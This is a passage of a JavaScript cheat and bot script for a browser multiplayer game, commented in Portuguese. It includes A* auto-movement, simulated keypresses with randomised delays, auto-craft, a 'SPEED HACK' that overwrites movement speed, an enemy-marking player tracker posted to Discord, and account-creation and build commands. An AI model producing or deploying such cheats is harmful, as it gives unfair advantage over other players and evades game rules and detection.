	if (_bound <= 42) {
		_bound = 42;
	}
	for (k = 0; k < 16; k++) {
		for (j = _bound; j < 46; j++) {
			xSolids[j][k] = "Void";
		}
	}

    for (i in mobs.items) {
        if (mobs.items[i] != undefined) {

            for (j = 0; j < 46; j++) {
                for (k = 0; k < 16; k++) {
                    if (mobs.items[i].x == (j + xSolidsPos[0]) && mobs.items[i].y == (k + xSolidsPos[1])) {
                        if (mobs.items[i].name != myself.name) {
                            xSolids[j][k] = mobs.items[i].name;
                        }
                    }
                }
            }
        }
    }

    xGCost[xStartPos[0]][xStartPos[1]] = 1;
    xACost[xStartPos[0]][xStartPos[1]] = xGetDistance(xStartPos[0], xStartPos[1], xEndPos[0], xEndPos[1]);
    xGOpen[xStartPos[0]][xStartPos[1]] = true;
    xGetOpenTiles();
}
async function xGetCanMove(ex, wy) {
    xCheck(ex, wy);
    await WaitForCheck();
    return xCanMov;
}
async function WaitForCheck() {
    if (xCheckingNow) {
        await xDelay(300);
        await WaitForCheck();
    }

}
async function xCheck(ex, wy) {
    if (xCheckingNow)
        return;
    xCheckingNow = true;
    xGCostCH = new Array(46);
    for (var i = 0; i < xGCostCH.length; i++) {
        xGCostCH[i] = new Array(16).fill(undefined);
    }
    xACostCH = new Array(46);
    for (var i = 0; i < xACostCH.length; i++) {
        xACostCH[i] = new Array(16).fill(undefined);
    }
    xGOpenCH = new Array(46);
    for (var i = 0; i < xGOpenCH.length; i++) {
        xGOpenCH[i] = new Array(16).fill(false);
    }
    xMoveListCH = new Array(0);
    xSolidsPosCH[0] = myself.x - 23;
    xSolidsPosCH[1] = myself.y - 8;
    xStartPosCH[0] = 23;
    xStartPosCH[1] = 8;
    xEndPosCH[0] = ex - xSolidsPosCH[0];
    xEndPosCH[1] = wy - xSolidsPosCH[1];
    if (xEndPosCH[0] >= 46) {
        xEndPosCH[0] = 45;
    }
    if (xEndPosCH[0] <= 0) {
        xEndPosCH[0] = 1;
    }
    if (xEndPosCH[1] >= 16) {
        xEndPosCH[1] = 15;
    }
    if (xEndPosCH[1] <= 0) {
        xEndPosCH[1] = 1;
    }
    xSolidsCH = new Array(46);
    for (var i = 0; i < xSolidsCH.length; i++) {
        xSolidsCH[i] = new Array(16).fill(undefined);
    }

    for (j = 0; j < 46; j++) {

        for (k = 0; k < 16; k++) {
            if (xGetTileByPos((j + xSolidsPosCH[0]), (k + xSolidsPosCH[1])) == 325) {
                xSolidsCH[j][k] = "Water";
            }
        }
    }

    for (i in objects.items) {
        if (objects.items[i] != undefined) {
            if (objects.items[i].can_pickup == 0) {

                for (j = 0; j < 46; j++) {
                    for (k = 0; k < 16; k++) {
                        if ((objects.items[i].x == (j + xSolidsPosCH[0])) && (objects.items[i].y == (k + xSolidsPosCH[1]))) {
                            if (objects.items[i].can_block == 1) {
                                xSolidsCH[j][k] = objects.items[i].name;
                            }
                        }
                    }
                }
            }
        }
    }
	// ── Paredes do mapa ──────────────────────────────────────────
	for (j = 0; j < 46; j++) {
		for (k = 0; k < 16; k++) {
			if (xSolidsCH[j][k] !== undefined) continue; // já marcado
			const wall = xGetWallByPos((j + xSolidsPosCH[0]), (k + xSolidsPosCH[1]));
			if (wall && wall.can_block === 1) {
				xSolidsCH[j][k] = wall.name;
			}
		}
	}
    let _bound = 0;
	for (k = 0; k < 16; k++) {
		for (j = 0; j < 46; j++) {
			if (xSolidsCH[j][k] != undefined) {
				_bound = k - 1;
				break;
			}
		}
	}
	if (_bound >= 4) {
		_bound = 4;
	}
	for (k = 0; k < 16; k++) {
		for (j = 0; j < _bound; j++) {
			xSolidsCH[j][k] = "Void";
		}
	}

    _bound = 0;
	for (k = 0; k < 16; k++) {
		for (j = 45; j > 0; j--) {
			if (xSolidsCH[j][k] != undefined) {
				_bound = k - 1;
				break;
			}
		}
	}
	if (_bound <= 42) {
		_bound = 42;
	}
	for (k = 0; k < 16; k++) {
		for (j = _bound; j < 46; j++) {
			xSolidsCH[j][k] = "Void";
		}
	}

    for (i in mobs.items) {
        if (mobs.items[i] != undefined) {

            for (j = 0; j < 46; j++) {
                for (k = 0; k < 16; k++) {
                    if (mobs.items[i].x == (j + xSolidsPosCH[0]) && mobs.items[i].y == (k + xSolidsPosCH[1])) {
                        if (mobs.items[i].name != myself.name) {
                            xSolidsCH[j][k] = mobs.items[i].name;
                        }
                    }
                }
            }
        }
    }

    xGCostCH[xStartPosCH[0]][xStartPosCH[1]] = 1;
    xACostCH[xStartPosCH[0]][xStartPosCH[1]] = xGetDistance(xStartPosCH[0], xStartPosCH[1], xEndPosCH[0], xEndPosCH[1]);
    xGOpenCH[xStartPosCH[0]][xStartPosCH[1]] = true;
    xGetOpenTilesCH();
}
function xGetOpenTilesCH() {
    xTemp[115] = 10000000;
    xTemp[116] = 0;
    xTemp[117] = 0;
    for (j = 0; j < 46; j++) {
        for (k = 0; k < 16; k++) {
            if (xGOpenCH[j][k]) {
                if (xACostCH[j][k] + xGCostCH[j][k] <= xTemp[115]) {
                    xTemp[115] = xACostCH[j][k] + xGCostCH[j][k];
                    xTemp[116] = j;
                    xTemp[117] = k;
                }
            }
        }
    }
    if (xTemp[116] == 0 || xTemp[117] == 0 || xTemp[116] == 46 || xTemp[117] == 16) {
        var oldEnd11 = xEndPosCH[0];
        var oldEnd22 = xEndPosCH[1];
        xSetEndLowACH();
        if (xGetDistance(oldEnd11, oldEnd22, xEndPosCH[0], xEndPosCH[1]) <= 1) {
            xCanMov = true;
            xCheckingNow = false;
        } else {
            xCanMov = false;
            xCheckingNow = false;
        }
    } else {
        xSetOpenCH(xTemp[116], xTemp[117]);
    }
}
async function xSetOpenCH(ex, wy) {
    if (xGetSolidsCH(ex, wy) != true) {
        xGOpenCH[ex][wy] = false;
        if (ex == xEndPosCH[0] && wy == xEndPosCH[1]) {
            xCanMov = true;
            xCheckingNow = false;
        } else {
            if (xGetSolidsCH(ex + 1, wy) != true && xGCostCH[ex + 1][wy] == undefined) {

                xGCostCH[ex + 1][wy] = xGCostCH[ex][wy] + 1;
                xACostCH[ex + 1][wy] = xGetDistance(ex + 1, wy, xEndPosCH[0], xEndPosCH[1]);
                xGOpenCH[ex + 1][wy] = true;
            }
            if (xGetSolidsCH(ex - 1, wy) != true && xGCostCH[ex - 1][wy] == undefined) {

                xGCostCH[ex - 1][wy] = xGCostCH[ex][wy] + 1;
                xACostCH[ex - 1][wy] = xGetDistance(ex - 1, wy, xEndPosCH[0], xEndPosCH[1]);
                xGOpenCH[ex - 1][wy] = true;
            }
            if (xGetSolidsCH(ex, wy + 1) != true && xGCostCH[ex][wy + 1] == undefined) {

                xGCostCH[ex][wy + 1] = xGCostCH[ex][wy] + 1;
                xACostCH[ex][wy + 1] = xGetDistance(ex, wy + 1, xEndPosCH[0], xEndPosCH[1]);
                xGOpenCH[ex][wy + 1] = true;
            }
            if (xGetSolidsCH(ex, wy - 1) != true && xGCostCH[ex][wy - 1] == undefined) {

                xGCostCH[ex][wy - 1] = xGCostCH[ex][wy] + 1;
                xACostCH[ex][wy - 1] = xGetDistance(ex, wy - 1, xEndPosCH[0], xEndPosCH[1]);
                xGOpenCH[ex][wy - 1] = true;
            }
            xGetOpenTilesCH();
        }
    } else {
        xGOpenCH[ex][wy] = false;
        xGetOpenTilesCH();

    }

}
async function xSetOpen(ex, wy) {
    if (xGetSolids(ex, wy) != true) {
        xGOpen[ex][wy] = false;
        if (ex == xEndPos[0] && wy == xEndPos[1]) {
            xACost = new Array(46);
            for (var i = 0; i < xGCost.length; i++) {
                xACost[i] = new Array(16).fill(undefined);
            }
            xFindPath(xEndPos[0], xEndPos[1], -1);
        } else {
            if (xGetSolids(ex + 1, wy) != true && xGCost[ex + 1][wy] == undefined) {

                xGCost[ex + 1][wy] = xGCost[ex][wy] + 1;
                xACost[ex + 1][wy] = xGetDistance(ex + 1, wy, xEndPos[0], xEndPos[1]);
                xGOpen[ex + 1][wy] = true;
            }
            if (xGetSolids(ex - 1, wy) != true && xGCost[ex - 1][wy] == undefined) {

                xGCost[ex - 1][wy] = xGCost[ex][wy] + 1;
                xACost[ex - 1][wy] = xGetDistance(ex - 1, wy, xEndPos[0], xEndPos[1]);
                xGOpen[ex - 1][wy] = true;
            }
            if (xGetSolids(ex, wy + 1) != true && xGCost[ex][wy + 1] == undefined) {

                xGCost[ex][wy + 1] = xGCost[ex][wy] + 1;
                xACost[ex][wy + 1] = xGetDistance(ex, wy + 1, xEndPos[0], xEndPos[1]);
                xGOpen[ex][wy + 1] = true;
            }
            if (xGetSolids(ex, wy - 1) != true && xGCost[ex][wy - 1] == undefined) {

                xGCost[ex][wy - 1] = xGCost[ex][wy] + 1;
                xACost[ex][wy - 1] = xGetDistance(ex, wy - 1, xEndPos[0], xEndPos[1]);
                xGOpen[ex][wy - 1] = true;
            }
            xGetOpenTiles();
        }
    } else {
        xGOpen[ex][wy] = false;
        xGetOpenTiles();

    }

}
function xSetEndLowA() {
    xTemp[85] = 10000;
    xTemp[86] = 0;
    xTemp[87] = 0;
    for (j = 0; j < 46; j++) {
        for (k = 0; k < 16; k++) {
            if (xACost[j][k] != undefined) {
                if (xACost[j][k] <= xTemp[85]) {
                    xTemp[85] = xACost[j][k];
                    xTemp[86] = j;
                    xTemp[87] = k;
                }
            }
        }
    }
    xEndPos[0] = xTemp[86];
    xEndPos[1] = xTemp[87];
}
function xSetEndLowACH() {
    xTemp[115] = 10000;
    xTemp[116] = 0;
    xTemp[117] = 0;
    for (j = 0; j < 46; j++) {
        for (k = 0; k < 16; k++) {
            if (xACostCH[j][k] != undefined) {
                if (xACostCH[j][k] <= xTemp[115]) {
                    xTemp[115] = xACostCH[j][k];
                    xTemp[116] = j;
                    xTemp[117] = k;
                }
            }
        }
    }
    xEndPosCH[0] = xTemp[116];
    xEndPosCH[1] = xTemp[117];
}
function xGetOpenTiles() {
    xTemp[85] = 10000000;
    xTemp[86] = 0;
    xTemp[87] = 0;
    for (j = 0; j < 46; j++) {
        for (k = 0; k < 16; k++) {
            if (xGOpen[j][k]) {
                if (xACost[j][k] + xGCost[j][k] <= xTemp[85]) {
                    xTemp[85] = xACost[j][k] + xGCost[j][k];
                    xTemp[86] = j;
                    xTemp[87] = k;
                }
            }
        }
    }
    if (xTemp[86] == 0 || xTemp[87] == 0 || xTemp[86] == 46 || xTemp[87] == 16) {
        xSetEndLowA();
        xACost = new Array(46);
        for (var i = 0; i < xGCost.length; i++) {
            xACost[i] = new Array(16).fill(undefined);
        }
        xFindPath(xEndPos[0], xEndPos[1], -1);
    } else {
        xSetOpen(xTemp[86], xTemp[87]);
    }
}
function xGetSolids(ex, wy) {
    if (ex >= 46 || ex <= 0 || wy >= 16 || wy <= 0) {
        return true;
    } else if (xSolids[ex][wy] != undefined) {
        return true;
    } else {
        return false;
    }
}
function xGetSolidsCH(ex, wy) {
    if (ex >= 46 || ex <= 0 || wy >= 16 || wy <= 0) {
        return true;
    } else if (xSolidsCH[ex][wy] != undefined) {
        return true;
    } else {
        return false;
    }
}
function xGetCheckLoaded(ex, wy) {
    if (xGetTileByPos(ex, wy) == 0 || xGetTileByPos(ex, wy) == undefined) {
        return false;
    } else {
        return true;
    }
}

function xGetDistance(x1, y1, x2, y2) {
    return Math.abs(x1 - x2) + Math.abs(y1 - y2);
}

function xGetDistanceTwo(x1, x2) {
    return Math.abs(x1 - x2);
}
async function xFindPath(ex, wy, Direc) {
    //console.log(ex + ", " + wy);
    if (xGCost[ex - 1][wy] == xGCost[ex][wy] - 1) {
        if (Direc == 4) {
            xGCost[ex][wy] = 111;
            xACost[ex][wy] = 4;
        } else {
            xGCost[ex][wy] = 222;
            xACost[ex][wy] = 4;

        }
        xFindPath(ex - 1, wy, 4)
    } else if (xGCost[ex + 1][wy] == xGCost[ex][wy] - 1) {
        if (Direc == 2) {
            xGCost[ex][wy] = 111;
            xACost[ex][wy] = 2;
        } else {
            xGCost[ex][wy] = 222;
            xACost[ex][wy] = 2;

        }
        xFindPath(ex + 1, wy, 2)
    } else if (xGCost[ex][wy - 1] == xGCost[ex][wy] - 1) {
        if (Direc == 1) {
            xGCost[ex][wy] = 111;
            xACost[ex][wy] = 1;
        } else {
            xGCost[ex][wy] = 222;
            xACost[ex][wy] = 1;

        }
        xFindPath(ex, wy - 1, 1)
    } else if (xGCost[ex][wy + 1] == xGCost[ex][wy] - 1) {
        if (Direc == 3) {
            xGCost[ex][wy] = 111;
            xACost[ex][wy] = 3;
        } else {
            xGCost[ex][wy] = 222;
            xACost[ex][wy] = 3;

        }
        xFindPath(ex, wy + 1, 3)
    }
    if (ex == xStartPos[0] && wy == xStartPos[1]) {

        xDoMoveMaker();
    }
}
function xGetTileByPos(ex, wy) {
    if (map[loc2tile(ex, wy)] != undefined) {
        if (map[loc2tile(ex, wy)].spr == 771) {
            return 325;
        } else {
            return map[loc2tile(ex, wy)].spr;
        }
    }
}
function xDelay(milliseconds) {
    return new Promise(function (resolve) {
        setTimeout(resolve, milliseconds + ((Math.random() * (milliseconds) / 10) + 25));
    });
}
async function xDoMoveMaker() {
    xACost[myself.x - xSolidsPos[0]][myself.y - xSolidsPos[1]] = undefined;
    if (myself.x - xSolidsPos[0] >= 45 || myself.x - xSolidsPos[0] <= 1 || myself.y - xSolidsPos[1] >= 15 || myself.y - xSolidsPos[1] <= 1) {

        xDoKeyUp(1);
        xDoKeyUp(2);
        xDoKeyUp(3);
        xDoKeyUp(0);
        xMovingNow = false;

    } else if (xACost[myself.x - xSolidsPos[0] + 1][myself.y - xSolidsPos[1]] != undefined) {

        if (xGetSolidByID(myself.x + 1, myself.y) == undefined) {
            xDoKeyDown(0);
            xDoKeyUp(1);
            xDoKeyUp(2);
            xDoKeyUp(3);
            await xDelay(40);
            xDoMoveMaker();

        } else {
            xDoKeyUp(1);
            xDoKeyUp(2);
            xDoKeyUp(3);
            xDoKeyUp(0);
            xMovingNow = false;

        }
    }
    else if (xACost[myself.x - xSolidsPos[0] - 1][myself.y - xSolidsPos[1]] != undefined) {

        if (xGetSolidByID(myself.x - 1, myself.y) == undefined) {
            xDoKeyDown(1);
            xDoKeyUp(0);
            xDoKeyUp(2);
            xDoKeyUp(3);
            await xDelay(40);
            xDoMoveMaker();

        } else {
            xDoKeyUp(1);
            xDoKeyUp(2);
            xDoKeyUp(3);
            xDoKeyUp(0);
            xMovingNow = false;

        }
    }
    else if (xACost[myself.x - xSolidsPos[0]][myself.y - xSolidsPos[1] - 1] != undefined) {

        if (xGetSolidByID(myself.x, myself.y - 1) == undefined) {
            xDoKeyDown(2);
            xDoKeyUp(1);
            xDoKeyUp(0);
            xDoKeyUp(3);
            await xDelay(40);
            xDoMoveMaker();

        } else {
            xDoKeyUp(1);
            xDoKeyUp(2);
            xDoKeyUp(3);
            xDoKeyUp(0);
            xMovingNow = false;

        }
    }
    else if (xACost[myself.x - xSolidsPos[0]][myself.y - xSolidsPos[1] + 1] != undefined) {

        if (xGetSolidByID(myself.x, myself.y + 1) == undefined) {
            xDoKeyDown(3);
            xDoKeyUp(1);
            xDoKeyUp(2);
            xDoKeyUp(0);
            await xDelay(40);
            xDoMoveMaker();

        } else {
            xDoKeyUp(1);
            xDoKeyUp(2);
            xDoKeyUp(3);
            xDoKeyUp(0);
            xMovingNow = false;

        }
    } else {
        xDoKeyUp(1);
        xDoKeyUp(2);
        xDoKeyUp(3);
        xDoKeyUp(0);
        xMovingNow = false;
    }
}
function xGetSolidByID(ex, wy) {
    xTemp[14] = undefined;
    for (i in objects.items) {
        if (objects.items[i] != undefined) {
            if (objects.items[i].can_pickup == 0) {
                if (objects.items[i].x == ex && objects.items[i].y == wy) {
                    if (objects.items[i].can_block == 1) {
                        xTemp[14] = objects.items[i];
                    }
                }
            }
        }
    }
    for (i in mobs.items) {
        if (mobs.items[i] != undefined) {
            if (mobs.items[i].x == ex && mobs.items[i].y == wy) {
                xTemp[14] = mobs.items[i];
            }
        }
    }
    try {
        if (xGetTileByPos(ex, wy) == 325) {
            return myself;
        } else {
            return xTemp[14];
        }
    } catch {
        return xTemp[14];
    }
}
async function xDoKeyUp(id) {
    await xDelay(25);
    jv.key_array[id].isDown = false;
    jv.key_array[id].isUP = true;
    await xDelay(25);
    if (id == 6) {

        await xDelay(25);
        await xDoKeyPress(6, 102);
        await xDelay(25);
    }
}
async function xDoKeyDown(id) {
    await xDelay(25);
    jv.key_array[id].isDown = true;
    jv.key_array[id].isUP = false;
    await xDelay(25);
}
async function xDoKeyPress(id, milliseconds) {
    await xDelay(25);
    if (id >= 7) {
        if (id == 7) {
            await xDelay(milliseconds / 2);
            key1.press();
            await xDelay(milliseconds / 2);
        } else if (id == 8) {
            await xDelay(milliseconds / 2);
            key2.press();
            await xDelay(milliseconds / 2);
        } else if (id == 9) {
            await xDelay(milliseconds / 2);
            key3.press();
            await xDelay(milliseconds / 2);
        } else if (id == 10) {
            await xDelay(milliseconds / 2);
            key4.press();
            await xDelay(milliseconds / 2);
        } else if (id == 11) {
            await xDelay(milliseconds / 2);
            key5.press();
            await xDelay(milliseconds / 2);
        } else if (id == 12) {
            await xDelay(milliseconds / 2);
            key6.press();
            await xDelay(milliseconds / 2);
        } else if (id == 13) {
            await xDelay(milliseconds / 2);
            key7.press();
            await xDelay(milliseconds / 2);
        } else if (id == 14) {
            await xDelay(milliseconds / 2);
            key8.press();
            await xDelay(milliseconds / 2);
        } else if (id == 15) {
            await xDelay(milliseconds / 2);
            key9.press();
            await xDelay(milliseconds / 2);
        }
    } else
        if (id == 5) {
            await xDelay(milliseconds / 2);
            keyShift.press();
            await xDelay(milliseconds / 2);
        } else {
            jv.key_array[id].isDown = true;
            jv.key_array[id].isUP = false;
            await xDelay(milliseconds);
            jv.key_array[id].isDown = false;
            jv.key_array[id].isUP = true;
        }
    await xDelay(25);
}
async function xDoPickUp() {
    await xDelay(178);
    send({
        type: "g"
    });
    await xDelay(179);
}
function xIfChatHas(chat) {
    for (i in jv.chat_box.lines) {
        if (jv.chat_box.lines[i].text.indexOf(chat) != -1) {
            return true;
        }
    }
    return false;
}
async function xDoClearChat(text) {
    for (id in jv.chat_box.lines) {
        if (jv.chat_box.lines[id].text.indexOf(text) != -1) {
            jv.chat_box.lines[id].text = jv.chat_box.lines[id].text.toLocaleLowerCase()
                .replaceAll("a", "x")
                .replaceAll("b", "x")
                .replaceAll("c", "x")
                .replaceAll("d", "x")
                .replaceAll("e", "x")
                .replaceAll("f", "x")
                .replaceAll("g", "x")
                .replaceAll("h", "x")
                .replaceAll("i", "x")
                .replaceAll("j", "x")
                .replaceAll("k", "x")
                .replaceAll("l", "x")
                .replaceAll("m", "x")
                .replaceAll("n", "x")
                .replaceAll("o", "x")
                .replaceAll("p", "x")
                .replaceAll("q", "x")
                .replaceAll("r", "x")
                .replaceAll("s", "x")
                .replaceAll("t", "x")
                .replaceAll("u", "x")
                .replaceAll("v", "x")
                .replaceAll("w", "x")
                .replaceAll("y", "x")
                .replaceAll("z", "x")
        }
    }
}
async function xDoUseSlot(slotID) {
    await xDelay(173);
    send({
        type: "u",
        slot: slotID
    })
    await xDelay(178);
}
async function xDoSwapSlot(slot1, slot2) {
    await xDelay(179);
    send({
        type: "sw",
        slot: slot1 - 1,
        swap: slot2 - 1
    });
    await xDelay(176);
}
async function xDoUseSlotByID(slotID) { //--
    await xDelay(181);
    send({
        type: "u",
        slot: slotID
    })
    await xDelay(183);
}

//HIDE NAME //

dsk.hide = {
  enabled: false
};

dsk.setCmd('/hide', () => {
  dsk.hide.enabled = !dsk.hide.enabled;

  if (dsk.hide.enabled) {
    myself.title.alpha = 0;
    dsk.localMsg('Título: Oculto', '#f55');
  } else {
    myself.title.alpha = 1;
    dsk.localMsg('Título: Visível', '#5f5');
  }
});


// ── AUTO CRAFT ─────────────────────────────────────────────

dsk.craft = {
  enabled: false
};

dsk.craft.loop = async () => {
  while (dsk.craft.enabled) {

	if (currentLevel > 0 && skillLevel >= currentLevel && ['crafting'].includes(skillName)) {
	await xDelay(1000);
	dsk.craft.enabled = false;
	dsk.localMsg('Craft: Desativado', '#f55');
    return;
	}
	if (dskPaused) return; // ← adiciona isso
    if (!myself || game_state !== 2) return;

    if (game_state == 2) {
      send({ type: "bld", tpl: "wood_arrow" });
      await dsk.wait(150);
    }

    await dsk.wait(50); // proteção anti-freeze
  }
};

// ── AUTO FOLLOW ─────────────────────────────────────────────

dsk.on('postLoop', () => {
  if (!dsk.follow.enabled) return;
  if (!myself || !mobs?.items) return;
  if (xMovingNow) return; // já está se movendo

  const target = mobs.items.find(el => el?.name === dsk.follow.targetName);
  if (!target) return;

  // Só move se estiver a mais de 1 tile de distância
  const dist = Math.abs(myself.x - target.x) + Math.abs(myself.y - target.y);
  if (dist > 1) {
    xDoMove(target.x, target.y);
  }
});

// ── SPEED HACK ─────────────────────────────────────────────

dsk.speed = {
  enabled: false,
  interval: null,
  value: 250  // valor padrão
};

dsk.speed.start = () => {
  if (dsk.speed.interval) return;

  dsk.speed.interval = setInterval(() => {
    if (dskPaused) return;
    if (!myself || game_state !== 2) return;

    myself.cur_speed = dsk.speed.value;
    last_dest = 9e10;
  }, 5);

  dsk.localMsg(`Speed: Ativado (${dsk.speed.value})`, '#5f5');
};

dsk.speed.stop = () => {
  if (!dsk.speed.interval) return;

  clearInterval(dsk.speed.interval);
  dsk.speed.interval = null;

  dsk.localMsg('Speed: Desativado', '#f55');
};

// ── WHO MANAGER ─────────────────────────────────────────────

dsk.whoManager = jv.Dialog.create(300, 320);
const wm = dsk.whoManager;
wm.visible = false;
wm.enemies = [];

wm.header = jv.text('Players Online', {
  font: '16px Verdana',
  fill: 0xFFD700,
  stroke: 0x555555,
  strokeThickness: 2,
});
wm.addChild(wm.header);
jv.center(wm.header);
jv.top(wm.header, 4);

wm.close = jv.Button.create(0, 0, 24, 'X', wm, 24);
jv.top(wm.close, 4);
jv.right(wm.close, 4);
wm.close.on_click = () => (wm.visible = 0);

wm.move = jv.Button.create(0, 0, 24, '@', wm, 24);
jv.top(wm.move, 4);
jv.right(wm.move, 28);

wm._px = 0;
wm._py = 0;
window.addEventListener('mousemove', e => { wm._px = e.clientX; wm._py = e.clientY; });
window.addEventListener('touchmove', e => { wm._px = e.touches[0].clientX; wm._py = e.touches[0].clientY; });

wm.updatePosition = () => {
  if (wm.move.is_pressed) {
    const canvas = document.querySelector('canvas');
    const rect = canvas ? canvas.getBoundingClientRect() : { left: 0, top: 0, width: jv.game_width, height: jv.game_height };
    wm.x = (wm._px - rect.left) * (jv.game_width / rect.width) - wm.w / 2;
    wm.y = (wm._py - rect.top) * (jv.game_height / rect.height) - 12;
  }
  if (wm.x < 0) wm.x = 0;
  if (wm.y < 0) wm.y = 0;
  if (wm.x + wm.w > jv.game_width)  wm.x = jv.game_width - wm.w;
  if (wm.y + wm.h > jv.game_height) wm.y = jv.game_height - wm.h;
};
dsk.on('postLoop', wm.updatePosition);

// Paginação
wm.page = 0;
wm.perPage = 17;
wm.players = [];
wm.lines = [];

wm.btnPrev = jv.Button.create(0, 0, 24, '<', wm, 24);
jv.bottom(wm.btnPrev, 4);
wm.btnPrev.x = wm.w - 58;
wm.btnPrev.on_click = () => {
  if (wm.page > 0) { wm.page--; wm.render(); }
};

wm.btnNext = jv.Button.create(0, 0, 24, '>', wm, 24);
jv.bottom(wm.btnNext, 4);
wm.btnNext.x = wm.w - 30;
wm.btnNext.on_click = () => {
  const maxPage = Math.ceil(wm.players.length / wm.perPage) - 1;
  if (wm.page < maxPage) { wm.page++; wm.render(); }
};

wm.pageLabel = jv.text('', {
  font: '11px Verdana',
  fill: 0xffffff,
  stroke: 0x000000,
  strokeThickness: 2,
});
wm.pageLabel.x = wm.w - 100;
jv.bottom(wm.pageLabel, 8);
wm.addChild(wm.pageLabel);
wm.loadingLabel = jv.text('', {
  font: '11px Verdana',
  fill: 0xffffff,
  stroke: 0x000000,
  strokeThickness: 2,
  lineJoin: 'round',
});
wm.loadingLabel.x = 10;
wm.loadingLabel.y = 35;
wm.addChild(wm.loadingLabel);

wm.parse = (text) => {
  const matches = [...text.matchAll(/(\w+):(\d+)/g)];
  return matches.map(m => ({
    name:  m[1],
    level: parseInt(m[2]),
  })).sort((a, b) => b.level - a.level);
};

wm.render = () => {
  if (wm.lines) wm.lines.forEach(l => wm.removeChild(l));
  wm.lines = [];

  const start = wm.page * wm.perPage;
  const slice = wm.players.slice(start, start + wm.perPage);
  const maxPage = Math.ceil(wm.players.length / wm.perPage);

  slice.forEach((p, i) => {
    const isEnemy = wm.enemies.includes(p.name.toLowerCase());
    const color = isEnemy ? '#ff4444' : '#ffffff';
    const label = jv.text(`${isEnemy ? '⚔ ' : ''}${p.name} — Lv ${p.level}`, {
      font: '11px Verdana',
      fill: color,
      stroke: 0x000000,
      strokeThickness: 2,
      lineJoin: 'round',
    });
    label.x = 10;
    label.y = 35 + i * 15;
    wm.addChild(label);
    wm.lines.push(label);
  });

  wm.header.text = `Players Online (${wm.players.length})`;
  wm.pageLabel.text = `${wm.page + 1}/${maxPage}`;
  jv.center(wm.header);
};

dsk.on('postPacket:pkg', packet => {
  if (!wm.waiting) return;
  if (!packet?.data) return;

  try {
    const arr = JSON.parse(packet.data);
    arr.forEach(raw => {
      const item = JSON.parse(raw);
      if (item.type !== 'message') return;

      const text = dsk.stripHTMLTags(item.text);
      if (!text.includes('players:')) return;

      wm.players = wm.parse(text);
      wm.page = 0;
      wm.loadingLabel.text = '';
      wm.render();
      wm.waiting = false;

      // Envia para Discord se estiver ativo
      if (dsk.discord.enabled) {
        const lines = wm.players.map((p, i) => {
          const isEnemy = wm.enemies.includes(p.name.toLowerCase());
          return `${i + 1}. ${isEnemy ? '⚔ ' : ''}${p.name} — Lv ${p.level}`;
        }).join('\n');

        const msg = `**Players Online (${wm.players.length})**\n${lines}`;

        for (let i = 0; i < msg.length; i += 1900) {
          dsk.discord.send(dsk.discord.whoUrl, '[WHO]', msg.slice(i, i + 1900));
        }
      }
    });
  } catch (e) { console.log('WhoManager error:', e); }
});

// Comandos
dsk.setCmd('/on', () => {
  wm.visible = true;
  wm.waiting = true;
  wm.loadingLabel.text = 'Loading...';
  _originalSend({ type: 'chat', data: '/who' });
});

dsk.setCmd('/enemy', (context) => {
  if (!context) {
    dsk.localMsg('Uso: /enemy NomeJogador', '#ff0');
    return;
  }
  const name = context.trim().toLowerCase();
  if (wm.enemies.includes(name)) {
    dsk.removeFromArr(name, wm.enemies);
    dsk.localMsg(`Inimigo removido: ${context.trim()}`, '#f55');
  } else {
    wm.enemies.push(name);
    dsk.localMsg(`Inimigo adicionado: ${context.trim()}`, '#f44');
  }
  wm.render();
});

async function xDoSignUp(usernameVal, passVal, emailVal) {
    await xDelay(25);
    send({
        type: "login",
        user: jv.base64_encode(usernameVal),
        email: jv.base64_encode(emailVal),
        pass: jv.base64_encode(passVal)
    });
    await xDelay(25);
}

dsk.setCmd('/signup', async (context) => {
    if (!context) {
        dsk.localMsg('Uso: /signup usuario senha email', '#ff0');
        return;
    }

    const parts = context.trim().split(' ');

    if (parts.length < 3) {
        dsk.localMsg('Uso: /signup usuario senha email', '#ff0');
        return;
    }

    const usuario = parts[0];
    const senha   = parts[1];
    const email   = parts[2];

    dsk.localMsg(`Criando conta: ${usuario}...`, '#0ff');

    await xDoSignUp(usuario, senha, email);

    dsk.localMsg(`Conta criada: ${usuario}`, '#5f5');
});

async function xWaitWall(ex, wy, tries = 0) {
    if (tries > 50) {
        dsk.localMsg('xWaitWall: timeout!', '#f55');
        return;
    }
    if (xGetWallByPos(ex, wy) === undefined) {
        await xDelay(100);
        await xWaitWall(ex, wy, tries + 1);
    }
}

async function xDoBuild(type, dir) {
    await xDelay(250);
    send({ type: 'm', x: myself.x, y: myself.y, d: dir });
    await xDelay(250);
    send({ type: 'bld', tpl: type });
    await xDelay(250);
    if      (dir == 0) await xWaitWall(myself.x,     myself.y - 1);
    else if (dir == 1) await xWaitWall(myself.x + 1, myself.y    );
    else if (dir == 2) await xWaitWall(myself.x,     myself.y + 1);
    else if (dir == 3) await xWaitWall(myself.x - 1, myself.y    );
}

dsk.setCmd('/build', async (context) => {
    if (!context) {
        dsk.localMsg('Uso: /build <tipo> <direcao> <quantidade>', '#ff0');
        dsk.localMsg('Ex: /build stone_wall 1 5', '#ff0');
        dsk.localMsg('0=cima 1=direita 2=baixo 3=esquerda', '#ff0');
        return;
    }

    const parts  = context.trim().split(' ');
    const tipo   = parts[0];
    const dir    = parseInt(parts[1]);
    const amount = parseInt(parts[2]) || 1;

    if (isNaN(dir) || dir < 0 || dir > 3) {
        dsk.localMsg('Direcao invalida!', '#f55');
        return;
    }

    // Anda paralelo à direção de construção
    const moveOffset = {
        0: { x:  1, y:  0 }, // construindo pra cima → anda direita
        1: { x:  0, y:  1 }, // construindo pra direita → anda baixo
        2: { x:  1, y:  0 }, // construindo pra baixo → anda direita
        3: { x:  0, y:  1 }, // construindo pra esquerda → anda baixo
    };

    dsk.localMsg(`Build: construindo ${amount}x ${tipo}...`, '#0ff');

    for (let i = 0; i < amount; i++) {
        await xDoBuild(tipo, dir);
        await xDelay(300);

        if (i < amount - 1) { // não anda no último
            const nx = myself.x + moveOffset[dir].x;
            const ny = myself.y + moveOffset[dir].y;
            await xDoMove(nx, ny);
            await xDelay(400);
        }
    }

    dsk.localMsg(`Build: ${amount}x ${tipo} concluido!`, '#5f5');
});

dsk.setCmd('/buildsnake', async (context) => {
    const parts  = context?.trim().split(' ') ?? [];
    const tipo   = parts[0] || 'fire';
    const cols   = parseInt(parts[1]) || 10;
    const rows   = parseInt(parts[2]) || 2;

    dsk.localMsg(`BuildSnake: ${rows} linhas de ${cols}x ${tipo}...`, '#0ff');

    for (let row = 0; row < rows; row++) {
        const goingDown = row % 2 === 0; // linhas pares descem, ímpares sobem

